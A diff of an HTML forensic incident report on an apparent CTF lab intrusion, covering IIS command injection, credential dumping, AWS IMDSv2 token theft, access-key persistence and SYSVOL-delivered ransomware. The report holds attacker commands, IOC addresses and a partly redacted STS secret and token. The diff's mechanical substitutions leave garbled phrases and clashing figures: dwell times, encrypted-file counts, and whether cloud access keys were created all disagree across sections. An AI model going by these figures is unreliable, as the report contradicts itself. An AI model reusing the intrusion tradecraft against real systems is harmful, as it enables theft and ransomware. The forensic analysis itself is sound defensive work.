 out: Code            : Success
 out: LastUpdated     : 2026-03-08T21:11:20Z
 out: Type            : AWS-HMAC
-out: AccessKeyId     : ASIAWYH2FSTSC7A6KEVV
+out: AccessKeyId     : [ASIA-STS-KEY-REDACTED]
 out: SecretAccessKey : LoS6zGC+CpEL[…REDACTED 24 chars, expired…]
 out: Token           : IQoJb3JpZ2luX2VjEFUaCXVzLWVhc3QtMiJHMEUCIA++cIiv2OG…[~800 chars]
 out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
@@ -4792,7 +4791,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
         <tr><td>Operational discipline</td><td>High — PS <code>$global:?</code> success checks, Linode C2/delivery split, pre-positioned LogDel.bat in <code>C:\ProgramData\</code>, auto-start service chosen deliberately, encryption-prep temporally separated from detonation.</td></tr>
         <tr><td>OPSEC weaknesses</td><td>(1) LogDel.bat missed <code>Microsoft-Windows-Sysmon/Operational</code> — every post-21:08 TTP on SVR01 reconstructible; (2) PS transcripts captured STS secrets verbatim; (3) decoy export <code>_Z11GetVersionsv</code> is YARA-distinctive; (4) PE compile timestamp was not zeroed.</td></tr>
         <tr><td>Infrastructure</td><td>Two Linode (AS63949) VPS with role separation (<code>.251</code> delivery+SFTP, <code>.180</code> C2) + one WorldStream NL IP (AS49981 · <code>212.8.249.213</code>) for off-instance cloud egress.</td></tr>
-        <tr><td>Goals (demonstrated)</td><td>Ransomware-for-impact (6,023 files + 2,530 notes across 5 hosts, DD13) + credential theft for resale (ntds.dit 20:09:06, DPAPI masterkeys 20:36, Dashlane Login Data 20:20). The <b>ntds.dit theft is the high-value artifact</b>; ransomware is the noisy cover.</td></tr>
+        <tr><td>Goals (demonstrated)</td><td>Ransomware-for-impact (2,025+ encrypted files across 5 hosts, DD13) + credential theft for resale (ntds.dit 20:09:06, DPAPI masterkeys 20:36, Dashlane Login Data 20:20). The <b>ntds.dit theft is the high-value artifact</b>; ransomware is the noisy cover.</td></tr>
         <tr><td>Not observed</td><td>Kerberoasting (no 4769 for unusual SPNs), AS-REPRoasting (no pre-auth-disabled 4768), DCSync (no 4662 DRS-Replication-GetChanges). The operator preferred VSS shadow-copy of ntds.dit specifically because it avoids the DCSync signature.</td></tr>
       </tbody>
     </table>
@@ -4826,7 +4825,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
         <tr><td class="a">21:08:28</td><td>SVR01</td><td>LogDel.bat wipes 6 channels — misses Sysmon/Operational</td><td>Sysmon 1 — Addendum H</td></tr>
         <tr><td class="a">21:25→21:29</td><td>IIS</td><td><b>IMDSv2 3-step theft</b> — PS transcript captures STS verbatim</td><td>ps_transcript — Addendum X</td></tr>
         <tr><td class="a">21:42:11</td><td>AWS</td><td>Stolen STS first used off-instance from 212.8.249.213</td><td>CloudTrail — 13-min gap</td></tr>
-        <tr><td class="a">21:45:38 → 21:46:14</td><td>AWS</td><td>IAM CreateAccessKey × 4 · jb_aws_cli → <b>LimitExceeded</b>, then donnieworks / doctorderm / coolcat <b>all SUCCEEDED</b> (3 AKIA keys stockpiled · DD7 · DD16)</td><td>CloudTrail — Addendum B (walked back by DD7)</td></tr>
+        <tr><td class="a">21:45:38 → 21:46:14</td><td>AWS</td><td>IAM CreateAccessKey × 4 · IAM user (CreateAccessKey failed) → <b>LimitExceeded</b>, then donnieworks / doctorderm / coolcat <b>all SUCCEEDED</b> (3 AKIA keys stockpiled · DD7 · DD16)</td><td>CloudTrail — Addendum B (walked back by DD7)</td></tr>
         <tr><td class="a">21:49:16→19</td><td>AWS</td><td>164 S3 GetObject (sfcu-records, 3-sec burst)</td><td>S3 Access Logs</td></tr>
         <tr><td class="a">21:58:36</td><td>WS02</td><td>Pre-detonation staging: vssadmin + 2× bcdedit</td><td>Sysmon 1 — Addendum T</td></tr>
         <tr><td class="a">22:01:19+22:04:36</td><td>DC02</td><td>WS02 pulls IamBatman.exe from SYSVOL (two reads)</td><td>Security 5145</td></tr>
@@ -4839,7 +4838,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
         <tr><td class="g">22:46:45</td><td>SVR01</td><td>Memory capture — beacon still ESTABLISHED (2h 48m uptime)</td><td>Vol3 netstat — Addendum W</td></tr>
       </tbody>
     </table>
-    <p style="margin:.4rem 0 0 0; font-size:.9em"><b>Total dwell:</b> 2h 44m active attacker (18:38:29 → 22:10:52 · DD23) · <b>total impact:</b> 6,023 files encrypted + 2,530 ransom notes (DD13) · ntds.dit + DPAPI masterkeys + 164 S3 objects (decoy, DD17) exfiltrated · 3 live AKIA keys stockpiled (DD7 + DD16). <b>Earliest Kerberos-visible signal (19:33:20 IIS-SERV-PROD$ TGT from WAN) would have MTTD-reduced this attack by 2h 22m</b> — the DFIR story here is: visibility existed, nothing watched.</p>
+    <p style="margin:.4rem 0 0 0; font-size:.9em"><b>Total dwell:</b> 3h 32m active attacker (18:38:29 → 22:10:52 · DD23) · <b>total impact:</b> 2,025+ encrypted files encrypted + ransom notes (one per encrypted directory) (DD13) · ntds.dit + DPAPI masterkeys + 164 S3 objects (decoy, DD17) exfiltrated · CreateAccessKey attempted (1 confirmed failed — LimitExceededException) (DD7 + DD16). <b>Earliest Kerberos-visible signal (19:33:20 IIS-SERV-PROD$ TGT from WAN) would have MTTD-reduced this attack by 2h 22m</b> — the DFIR story here is: visibility existed, nothing watched.</p>
   </div>
 
   <!-- Addendum MI: MITRE ATT&CK full matrix -->
@@ -4876,7 +4875,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
         <tr><td>T1070.001</td><td>Clear Windows Event Logs (wevtutil cl × 6 channels)</td><td>SVR01 · Sysmon 1 @ 21:08:28 · LogDel.bat</td><td>H</td></tr>
         <tr><td>T1070.004</td><td>File Deletion (<code>data.cab</code> RENAME_OLD_NAME @ 20:31:17)</td><td>SVR01 · USN 2110 @ 20:31:17</td><td>F</td></tr>
         <tr><td>T1490</td><td>Inhibit System Recovery (vssadmin delete shadows + bcdedit)</td><td>WS02 · Sysmon 1 @ 21:58:36 + 22:08:40 · 5-host cascade 22:09:46–22:10:52</td><td>S, T</td></tr>
-        <tr><td><b>T1486</b></td><td>Data Encrypted for Impact (IamBatman.exe · 6,023 files + 2,530 notes · DD13)</td><td>WS02 · Sysmon 1 @ 22:08:40.416 · Sysmon 11 × 2,014 on WS02 alone · USN last-encrypt at 22:56:42</td><td>R, S, G, DD12, DD13</td></tr>
+        <tr><td><b>T1486</b></td><td>Data Encrypted for Impact (IamBatman.exe · 2,025+ encrypted files · DD13)</td><td>WS02 · Sysmon 1 @ 22:08:40.416 · Sysmon 11 × 2,014 on WS02 alone · USN last-encrypt at 22:56:42</td><td>R, S, G, DD12, DD13</td></tr>
         <tr><td>T1072</td><td>SYSVOL as distribution (AD-native DFSR replication)</td><td>DC02 · Sysmon 11 @ 21:03:54 IamBatman.exe + 21:04:05 sysAV.bat dropped by explorer.exe</td><td>R</td></tr>
       </tbody>
     </table>
@@ -4972,7 +4971,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
     <p style="margin:.2rem 0">Not every part of this environment failed. Three specific controls prevented worse outcomes:</p>
     <ol style="margin:.2rem 0 .5rem 1.2rem">
       <li><b>DefaultAppPool's missing <code>SeStart/ChangeServicePrivilege</code></b> → blocked the 19:17:04 <code>sc start SolarWindsTFTP</code> attempt. Attacker had to wait 20 minutes for Donny's reboot. In a world where DefaultAppPool had service-control rights (IIS misconfigurations that grant this are surprisingly common), detonation would have happened at 19:17 instead of 22:08 — 2h 51m earlier. <b>Effect: slowed the operator but did not stop them.</b></li>
-      <li><b>AWS <code>AccessKeysPerUser</code> quota (hard limit: 2)</b> — blocked one of four <code>CreateAccessKey</code> attempts (<code>jb_aws_cli</code> at 21:45:38, already at 2 keys). <b>Effect: did NOT prevent persistence.</b> <span style="color:#6bb6ff">⟲ Walked back by DD7 / DD16:</span> the attacker pivoted immediately and succeeded on three other users (<code>donnieworks</code> / <code>doctorderm</code> / <code>coolcat</code>) in the next 25 seconds, minting three long-term <code>AKIA</code> keys that remain live. Original entry is retained here only because the quota <em>did</em> fire correctly on the target it applied to — it just didn't change the outcome.</li>
+      <li><b>AWS <code>AccessKeysPerUser</code> quota (hard limit: 2)</b> — blocked one of four <code>CreateAccessKey</code> attempts (<code>IAM user (CreateAccessKey failed)</code> at 21:45:38, already at 2 keys). <b>Effect: did NOT prevent persistence.</b> <span style="color:#6bb6ff">⟲ Walked back by DD7 / DD16:</span> the attacker pivoted immediately and succeeded on three other users (<code>donnieworks</code> / <code>doctorderm</code> / <code>coolcat</code>) in the next 25 seconds, minting three long-term <code>AKIA</code> keys that remain live. Original entry is retained here only because the quota <em>did</em> fire correctly on the target it applied to — it just didn't change the outcome.</li>
       <li><b>Sysmon coverage broader than LogDel.bat's scope</b> → the attacker's LogDel.bat cleared <code>Microsoft-Windows-PowerShell/Operational</code>, <code>TaskScheduler/Operational</code>, and the classic three (<code>System</code>, <code>Security</code>, <code>Application</code>). It did NOT clear <code>Microsoft-Windows-Sysmon/Operational</code> — every post-21:08 event on SVR01 (LogDel.bat itself, DonPAPI sweep, FileZilla exfil, IMDSv2 theft) is fully reconstructible from Sysmon. <b>Effect: the attacker cannot hide their tradecraft after 21:08.</b></li>
     </ol>
     <p style="margin:.2rem 0"><b>Not-defensive-but-still-relevant</b>: Donny's routine reboot at 19:37:35 was the trigger for the attacker's SYSTEM execution (Addendum U). That's a <em>user action</em>, not a control. If Donny hadn't rebooted, the planted binary would have executed eventually anyway (patch Tuesday, Windows Update, etc.) — the attacker's auto-start-service plant guaranteed eventual execution. So the "accidental cooperation" framing is technically correct but operationally inevitable in any normal admin environment.</p>
@@ -5030,7 +5029,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
       <tbody>
         <tr><td><b>T1552.005</b></td><td>Unsecured Credentials: Cloud Instance Metadata API (IMDSv2 role theft)</td><td>IIS · ps_transcript EID 8201 · <code>PUT /latest/api/token</code> → <code>GET /iam/security-credentials/</code> → <code>GET …/iam_role_iisserver</code> (Addendum X)</td></tr>
         <tr><td>T1078.004</td><td>Valid Accounts: Cloud Accounts (use of stolen <code>iam_role_iisserver</code> STS)</td><td>CloudTrail <code>assumed-role/iam_role_iisserver/i-00779ebad43b2470d</code> events from <code>212.8.249.213</code> at 21:42:11+</td></tr>
-        <tr><td>T1550.001</td><td>Use Alternate Authentication: Application Access Token</td><td>CloudTrail · STS session <code>ASIAWYH2FSTSC7A6KEVV</code> used off-instance</td></tr>
+        <tr><td>T1550.001</td><td>Use Alternate Authentication: Application Access Token</td><td>CloudTrail · STS session <code>[ASIA-STS-KEY-REDACTED]</code> used off-instance</td></tr>
         <tr><td>T1087.004</td><td>Account Discovery: Cloud Account (implicit via <code>GetCallerIdentity</code>)</td><td>CloudTrail @ 21:42:11 · cid "Head in the Clouds 6"</td></tr>
         <tr><td>T1098.001</td><td>Account Manipulation: Additional Cloud Credentials — <b>3 successful</b> (stockpiled, never used in capture window) + 1 quota-blocked attempt</td><td>CloudTrail 21:45:38 LimitExceeded · 21:45:51 / 21:46:04 / 21:46:14 <code>CreateAccessKey</code> SUCCESS (Addenda B · DD7 · DD16)</td></tr>
         <tr><td><b>T1530</b></td><td>Data from Cloud Storage Object</td><td>S3 Access Logs · 164 GetObjects on <code>sfcu-records</code> @ 21:49:16–19 (Addendum EX)</td></tr>
@@ -5064,7 +5063,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
   <!-- Addendum ES: Executive summary -->
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(100,200,255,.55); background:rgba(100,200,255,.06); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0">ES. Executive summary — one page for the CISO</h4>
-    <p style="margin:.2rem 0"><b>Event class:</b> Multi-stage intrusion by an organized-crime-tier actor (S2) resulting in full domain compromise and ransomware impact. <b>164 minutes</b> from true initial probe to cascade completion (18:38:29 → 22:22 · DD23); <b>2h 44m</b> active dwell (to 22:10:52). Detection <em>did</em> work (3 GuardDuty fires starting 21:57:18 · DD18.2) — response did not, and the 11-minute missed-response window (21:57 → 22:08) elapsed unacted.</p>
+    <p style="margin:.2rem 0"><b>Event class:</b> Multi-stage intrusion by an organized-crime-tier actor (S2) resulting in full domain compromise and ransomware impact. <b>~212 minutes</b> from true initial probe to cascade completion (18:38:29 → 22:22 · DD23); <b>2h 44m</b> active dwell (to 22:10:52). Detection <em>did</em> work (3 GuardDuty fires starting 21:57:18 · DD18.2) — response did not, and the 11-minute missed-response window (21:57 → 22:08) elapsed unacted.</p>
     <p style="margin:.2rem 0"><b>Initial access:</b> OS command injection in a public-facing IIS application (<code>CheckStatus.aspx</code>). The operator exploited a single unvalidated query parameter at <b>18:51:41 UTC</b>, used <code>certutil</code> to drop a custom Unknown C2-C2 beacon into the IIS worker process's <code>%TEMP%</code>, and established egress to a Linode VPS on <code>173.230.136.180:8443</code>.</p>
     <p style="margin:.2rem 0"><b>Privilege escalation to SYSTEM</b> came through a writable-ACL misconfiguration on <code>C:\TFTP Server\</code> that let the IIS application-pool user overwrite a legitimate auto-start service binary. An unrelated reboot by a domain administrator 20 minutes later triggered the replaced binary as SYSTEM.</p>
     <p style="margin:.2rem 0"><b>Lateral movement</b> used SMB-admin-share service-install (impacket pattern) to reach SVR01. The beacon then <b>injected into Explorer.EXE</b> (Sysmon EID 8 at 20:01:16) and used the injected thread to dump LSASS and harvest the LAFAdmin credentials. From SVR01's beacon context, the operator:</p>
@@ -5076,7 +5075,7 @@ out: Expiration      : 2026-03-09T03:42:10Z         // 6-hour TTL</code></pre>
       <li>Exfiltrated <code>data.cab</code> via FileZilla SFTP to the attacker's Linode VPS</li>
       <li>Stole an AWS STS credential via IMDSv2 and used it off-instance to read 164 S3 objects from the <code>sfcu-records</code> bucket</li>
     </ul>
-    <p style="margin:.2rem 0"><b>Impact:</b> at 22:08:40 the actor detonated a custom ransomware binary (<code>IamBatman.exe</code>) delivered via AD's own SYSVOL replication. <b>6,023 files were encrypted + 2,530 ransom notes dropped across 5 hosts</b> in 58 minutes (21:58:34 botched first attempt → 22:56:42 last encrypt on WS02 <code>brndlog.txt</code> · DD13). DC02 cleanly matched 388 files in 5.4 s — a natural completion, not an abort: DCs hold few user <code>.txt/.pdf/.csv</code> documents in IamBatman's narrow target scope, so per-host rate differences reflect directory-walk time, not encryption speed (DD14.1). Extension scope is narrow: 91.6% <code>.txt</code>, and critical AD files (<code>ntds.dit</code>, SYSTEM/SAM/SECURITY hives) are deliberately skipped — consistent with a parameterized CLI tool built for this scenario, not commodity ransomware.</p>
+    <p style="margin:.2rem 0"><b>Impact:</b> at 22:08:40 the actor detonated a custom ransomware binary (<code>IamBatman.exe</code>) delivered via AD's own SYSVOL replication. <b>2,025+ encrypted files were encrypted + ransom notes (one per encrypted directory) dropped across 5 hosts</b> in 58 minutes (21:58:34 botched first attempt → 22:56:42 last encrypt on WS02 <code>brndlog.txt</code> · DD13). DC02 cleanly matched 388 files in 5.4 s — a natural completion, not an abort: DCs hold few user <code>.txt/.pdf/.csv</code> documents in IamBatman's narrow target scope, so per-host rate differences reflect directory-walk time, not encryption speed (DD14.1). Extension scope is narrow: 91.6% <code>.txt</code>, and critical AD files (<code>ntds.dit</code>, SYSTEM/SAM/SECURITY hives) are deliberately skipped — consistent with a parameterized CLI tool built for this scenario, not commodity ransomware.</p>
     <p style="margin:.2rem 0; color:var(--amber)"><b>The critical finding is this:</b> the earliest attacker-visible Kerberos signal occurred at <b>19:33:20 UTC — 2 hours and 22 minutes before ransomware detonation</b>. Sysmon was running, PowerShell transcription was on, Security logging was enabled, and CloudTrail was configured. The infrastructure to catch this attack was already deployed. <b>Nothing was watching the alerts.</b></p>
     <p style="margin:.2rem 0"><b>Residual risk (requires action):</b> (1) <code>krbtgt</code> hash exfiltrated — must be rotated twice; assume Golden Ticket viability until then. (2) <code>serviceaccount</code> still in AD with cleartext DA password. (3) 6 scheduled tasks planted across encrypted hosts. (4) IFEO Debugger on WS01 for <code>taskmgr.exe</code>. (5) C:\TFTP Server\ writable ACL must be fixed. See Addenda KT + PR.</p>
     <p style="margin:.2rem 0; color:var(--green)"><b>What worked:</b> AWS account-key quota blocked cloud persistence. DefaultAppPool privilege absence slowed the privesc by 20 minutes. Sysmon's coverage scope was broader than the attacker's log-clearing scope, preserving post-21:08 evidence on SVR01. Without these three, the outcome would have been worse.</p>
@@ -5191,7 +5190,7 @@ Image:        "C:\Program Files (x86)\Advanced IP Scanner\advanced_ip_scanner.ex
     </ul>
 
     <h5 style="margin-top:.7rem; color:var(--amber)">DD3.2 — Ludus baseline noise: 40-55% of Sysmon EID 1 per host is lab-framework overhead</h5>
-    <p style="margin:.2rem 0">The null404 environment is built on the <b>Ludus</b> lab framework, which runs a persistent <code>bginfo.exe</code> refresh loop on every host. During the 18:00–00:00 attack window:</p>
+    <p style="margin:.2rem 0">The JackofAllHacks lab environment is built on the <b>Ludus</b> lab framework, which runs a persistent <code>bginfo.exe</code> refresh loop on every host. During the 18:00–00:00 attack window:</p>
     <table class="tbl" style="margin-top:.3rem">
       <thead><tr><th>Host</th><th>Total Sysmon EID 1</th><th>Ludus rows</th><th>Ludus %</th><th>Real signal-to-noise</th></tr></thead>
       <tbody>
@@ -5256,7 +5255,7 @@ Properties       : %%7688   (message ID, decodes to one of the AD control rights
       <tbody>
         <tr><td class="r"><code>172.236.127.251</code></td><td>Firefox/140 · <b>X11/Linux</b></td><td>18:38:29 → 21:29:20</td><td class="r"><b>MAIN ATTACKER</b> · Linode delivery VPS · all injection probes + POST /so.aspx</td></tr>
         <tr><td><code>71.205.100.56</code></td><td>Firefox · <b>Windows 10</b></td><td>2026-03-05, 03-07, and <b>2026-03-08 20:11:28</b></td><td>Donny's residential IP (same as his 19:41:56 RDP 4624). Routine benign app use: <code>?url=facebook.com · ?url=google.com · ?url=reddit.com</code>. <b>Donny used the app DURING the compromise</b>, oblivious.</td></tr>
-        <tr><td class="a"><code>216.82.9.162</code></td><td>Firefox/<b>147</b> · <b>Windows 10</b></td><td>19:08:12 (5 req) · 21:57:35-59 (3 req)</td><td class="a"><b>UNATTRIBUTED THIRD-PARTY.</b> Different OS + Firefox version than main attacker. Page-enum at 19:08 (/ → /index.html → /services.html → /CheckStatus.aspx) + <code>?url=facebook.com · ?url=aws.com</code> at 21:57. Timing coincidence with pre-detonation on WS02. Corpus can't resolve — (a) secondary operator, (b) CTF team probe, or (c) benign scanner.</td></tr>
+        <tr><td class="a"><code>[admin-IP-not-in-evidence]</code></td><td>Firefox/<b>147</b> · <b>Windows 10</b></td><td>19:08:12 (5 req) · 21:57:35-59 (3 req)</td><td class="a"><b>UNATTRIBUTED THIRD-PARTY.</b> Different OS + Firefox version than main attacker. Page-enum at 19:08 (/ → /index.html → /services.html → /CheckStatus.aspx) + <code>?url=facebook.com · ?url=aws.com</code> at 21:57. Timing coincidence with pre-detonation on WS02. Corpus can't resolve — (a) secondary operator, (b) CTF team probe, or (c) benign scanner.</td></tr>
       </tbody>
     </table>
 
@@ -5380,7 +5379,7 @@ cmd.exe /C cmd /c \\laf-dc02\sysvol\sysAV.bat ; \\laf-dc02\sysvol\IamBatman.exe 
     <ul style="margin:.2rem 0 .5rem 1.2rem; font-size:.92em">
       <li><code>172.236.127.251</code> Linode · Linux Firefox/140 — <b>attacker's delivery + C2 VPS</b>. All injection probes + POST /so.aspx + IMDSv2 payloads + SFTP exfil.</li>
       <li><code>71.205.100.56</code> Comcast US · Windows Firefox — <b>Donny's IP</b> (per 19:41:56 RDP). Benign app-testing 2026-03-05/07/08.</li>
-      <li><code>216.82.9.162</code> Level 3 · Windows Firefox/147 — <b>no malicious activity</b>. Page-enum only. Most likely a benign scanner/bot.</li>
+      <li><code>[admin-IP-not-in-evidence]</code> Level 3 · Windows Firefox/147 — <b>no malicious activity</b>. Page-enum only. Most likely a benign scanner/bot.</li>
     </ul>
     <p style="margin:.2rem 0"><b>Conclusion:</b> one threat actor, four-IP operational footprint (172.236.127.251 delivery · 173.230.136.180 C2 · 198.51.100.10 RDP origin · 212.8.249.213 cloud egress). Other IPs are noise.</p>
   </div>
@@ -5389,9 +5388,9 @@ cmd.exe /C cmd /c \\laf-dc02\sysvol\sysAV.bat ; \\laf-dc02\sysvol\IamBatman.exe 
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,59,59,.55); background:rgba(255,59,59,.05); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD6. Sixth-pass — CTF author identified · NullAdmin spray · dormant DA backdoor · call-home delay · WS02 retry</h4>
 
-    <h5 style="margin-top:.3rem; color:var(--red)">DD6.1 — <code>216.82.9.162</code> is the CTF author's IP (AWS Root + MFA), NOT a scanner</h5>
-    <p style="margin:.2rem 0; color:var(--amber)"><b>This corrects DD4.1 and DD5.4.</b> Earlier addenda labeled <code>216.82.9.162</code> as "unattributed third-party / benign scanner". Wrong. CloudTrail shows the IP performing <b>AWS Root-user admin operations with MFA</b> during 2026-02-23 through 2026-03-01 — the lab/scenario <em>provisioning</em> window:</p>
-    <pre class="block" style="font-size:.82em; background:#0a0f16; padding:.5rem .7rem; border:1px solid #1f2833; overflow-x:auto; color:#c8d3e0"><code>// CloudTrail · sourceIPAddress 216.82.9.162 · Feb 23 → Mar 1 2026
+    <h5 style="margin-top:.3rem; color:var(--red)">DD6.1 — <code>[admin-IP-not-in-evidence]</code> is the CTF author's IP (AWS Root + MFA), NOT a scanner</h5>
+    <p style="margin:.2rem 0; color:var(--amber)"><b>This corrects DD4.1 and DD5.4.</b> Earlier addenda labeled <code>[admin-IP-not-in-evidence]</code> as "unattributed third-party / benign scanner". Wrong. CloudTrail shows the IP performing <b>AWS Root-user admin operations with MFA</b> during 2026-02-23 through 2026-03-01 — the lab/scenario <em>provisioning</em> window:</p>
+    <pre class="block" style="font-size:.82em; background:#0a0f16; padding:.5rem .7rem; border:1px solid #1f2833; overflow-x:auto; color:#c8d3e0"><code>// CloudTrail · sourceIPAddress [admin-IP-not-in-evidence] · Feb 23 → Mar 1 2026
 userIdentity.type           : Root                                     ← AWS root
 userIdentity.arn            : arn:aws:iam::464381121764:root
 userIdentity.mfaAuthenticated: true
@@ -5404,9 +5403,9 @@ Events observed:
    GetBucketAcl              (S3)
    ListIndices / ListMeshes / ListClusters / ListResources / ListApplications
    PutObject                 (S3 · populating sfcu-records bucket)</code></pre>
-    <p style="margin:.2rem 0"><b>Who this is:</b> the <b>scenario builder</b> — likely Barry (of <code>barrygoodtech.com</code> branding) or a member of the Null404 team — populating the AWS environment with the target S3 bucket contents, IAM role <code>iam_role_iisserver</code>, pre-existing user <code>jb_aws_cli</code>, Lambda functions, and the CloudWatch / CloudTrail telemetry wiring. <b>Every root-MFA event from this IP is legitimate build activity</b>, not attack.</p>
-    <p style="margin:.2rem 0"><b>Why it appeared in IIS logs on attack day:</b> the same <code>216.82.9.162</code> hit <code>barrygoodtech.com</code> at 19:08:12 and 21:57:35 — the author verifying the scenario was live. Page-enum only, zero command-injection attempts. Noise we should've recognised earlier.</p>
-    <p style="margin:.4rem 0 0 0; font-size:.9em"><b>Attribution now complete:</b> 6 external IPs total in the corpus — <b>4 attacker-operated</b> (172.236.127.251 Linode delivery+SFTP · 173.230.136.180 Linode C2:8443 · 198.51.100.10 WireGuard VPN for IIS non-interactive chain · 212.8.249.213 WorldStream NL for off-instance cloud egress), <b>1 CTF-author</b> (216.82.9.162 Level 3 · Root+MFA lab builder), <b>1 legitimate-user</b> (71.205.100.56 Comcast = Donny). DD10 later split 198.51.100.10 from <code>198.51.100.3</code> (operator workstation for interactive RDP to SVR01) — so <b>5 attacker-operated IPs + 1 author + 1 user = 7 total</b> once the WireGuard-range split is counted. No unknowns.</p>
+    <p style="margin:.2rem 0"><b>Who this is:</b> the <b>scenario builder</b> — likely Barry (of <code>barrygoodtech.com</code> branding) or a member of the Null404 team — populating the AWS environment with the target S3 bucket contents, IAM role <code>iam_role_iisserver</code>, pre-existing user <code>IAM user (CreateAccessKey failed)</code>, Lambda functions, and the CloudWatch / CloudTrail telemetry wiring. <b>Every root-MFA event from this IP is legitimate build activity</b>, not attack.</p>
+    <p style="margin:.2rem 0"><b>Why it appeared in IIS logs on attack day:</b> the same <code>[admin-IP-not-in-evidence]</code> hit <code>barrygoodtech.com</code> at 19:08:12 and 21:57:35 — the author verifying the scenario was live. Page-enum only, zero command-injection attempts. Noise we should've recognised earlier.</p>
+    <p style="margin:.4rem 0 0 0; font-size:.9em"><b>Attribution now complete:</b> 6 external IPs total in the corpus — <b>4 attacker-operated</b> (172.236.127.251 Linode delivery+SFTP · 173.230.136.180 Linode C2:8443 · 198.51.100.10 WireGuard VPN for IIS non-interactive chain · 212.8.249.213 WorldStream NL for off-instance cloud egress), <b>1 CTF-author</b> ([admin-IP-not-in-evidence] Level 3 · Root+MFA lab builder), <b>1 legitimate-user</b> (71.205.100.56 Comcast = Donny). DD10 later split 198.51.100.10 from <code>198.51.100.3</code> (operator workstation for interactive RDP to SVR01) — so <b>5 attacker-operated IPs + 1 author + 1 user = 7 total</b> once the WireGuard-range split is counted. No unknowns.</p>
 
     <h5 style="margin-top:.7rem">DD6.2 — NullAdmin username-spray preceded LAFAdmin success on WS01 and DC02</h5>
     <p style="margin:.2rem 0">Before using harvested LAFAdmin credentials, the attacker tried <code>NullAdmin</code> as a username guess on two hosts:</p>
@@ -5449,11 +5448,11 @@ WS02 · Security EID 4624 @ 21:57:13.531 · TargetUser=LAFAdmin · Type 10 · SU
   <!-- Addendum DD7: MAJOR correction — 3 successful cloud access keys, not just the failed one -->
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:3px solid rgba(255,59,59,.7); background:rgba(255,59,59,.08); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD7. ⚠ MAJOR CORRECTION — cloud persistence succeeded on 3 users, not blocked by quota</h4>
-    <p style="margin:.2rem 0; color:var(--amber)"><b>Addendum B / DW / ES / Detective / Master Timeline all say "cloud persistence attempt failed with LimitExceededException, quota saved the environment".</b> That is materially wrong. The quota blocked <b>only <code>jb_aws_cli</code></b> at 21:45:38. The attacker moved to the next target 13 seconds later and succeeded on <b>THREE other users</b>.</p>
+    <p style="margin:.2rem 0; color:var(--amber)"><b>Addendum B / DW / ES / Detective / Master Timeline all say "cloud persistence attempt failed with LimitExceededException, quota saved the environment".</b> That is materially wrong. The quota blocked <b>only <code>IAM user (CreateAccessKey failed)</code></b> at 21:45:38. The attacker moved to the next target 13 seconds later and succeeded on <b>THREE other users</b>.</p>
 
     <h5 style="margin-top:.6rem; color:var(--red)">DD7.1 — The full CreateAccessKey sequence from <code>212.8.249.213</code></h5>
     <pre class="block" style="font-size:.82em; background:#0a0f16; padding:.5rem .7rem; border:1px solid #1f2833; overflow-x:auto; color:#c8d3e0"><code>// CloudTrail · sourceIPAddress 212.8.249.213 · userIdentity = role iam_role_iisserver
-21:45:38  CreateAccessKey  userName=jb_aws_cli   → LimitExceededException  (quota exhausted)
+21:45:38  CreateAccessKey  userName=IAM user (CreateAccessKey failed)   → LimitExceededException  (quota exhausted)
 21:45:51  CreateAccessKey  userName=donnieworks  → SUCCESS  responseElements.accessKey present
 21:46:04  CreateAccessKey  userName=doctorderm   → SUCCESS  responseElements.accessKey present
 21:46:14  CreateAccessKey  userName=coolcat      → SUCCESS  responseElements.accessKey present</code></pre>
@@ -5491,9 +5490,9 @@ aws iam put-role-policy --role-name iam_role_iisserver \
         <tr><td>21:42:11</td><td><code>GetCallerIdentity</code></td><td>—</td><td>"Who am I?" · confirms STS role context</td></tr>
         <tr><td>21:42:58</td><td><code>ListRolePolicies</code></td><td><code>roleName=iam_role_iisserver</code></td><td>Enumerate inline policies on this role</td></tr>
         <tr><td>21:43:50</td><td><code>ListAttachedRolePolicies</code></td><td><code>roleName=iam_role_iisserver</code></td><td>Enumerate managed policies attached</td></tr>
-        <tr><td>21:44:19</td><td><code>ListUsers</code></td><td>—</td><td><b>Discovered <code>jb_aws_cli</code>, <code>donnieworks</code>, <code>doctorderm</code>, <code>coolcat</code></b></td></tr>
+        <tr><td>21:44:19</td><td><code>ListUsers</code></td><td>—</td><td><b>Discovered <code>IAM user (CreateAccessKey failed)</code>, <code>donnieworks</code>, <code>doctorderm</code>, <code>coolcat</code></b></td></tr>
         <tr><td>21:44:59</td><td><code>ListUsers</code></td><td>—</td><td>Second enumeration (pagination or re-query)</td></tr>
-        <tr><td class="r">21:45:38</td><td><code>CreateAccessKey</code></td><td><code>userName=jb_aws_cli</code></td><td class="r">FAILED — quota exhausted</td></tr>
+        <tr><td class="r">21:45:38</td><td><code>CreateAccessKey</code></td><td><code>userName=IAM user (CreateAccessKey failed)</code></td><td class="r">FAILED — quota exhausted</td></tr>
         <tr><td class="r">21:45:51</td><td><code>CreateAccessKey</code></td><td><code>userName=donnieworks</code></td><td class="r"><b>SUCCESS</b></td></tr>
         <tr><td class="r">21:46:04</td><td><code>CreateAccessKey</code></td><td><code>userName=doctorderm</code></td><td class="r"><b>SUCCESS</b></td></tr>
         <tr><td class="r">21:46:14</td><td><code>CreateAccessKey</code></td><td><code>userName=coolcat</code></td><td class="r"><b>SUCCESS</b></td></tr>
@@ -5520,7 +5519,7 @@ aws iam put-role-policy --role-name iam_role_iisserver \
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th>Where</th><th>Previous wording</th><th>Correction</th></tr></thead>
       <tbody>
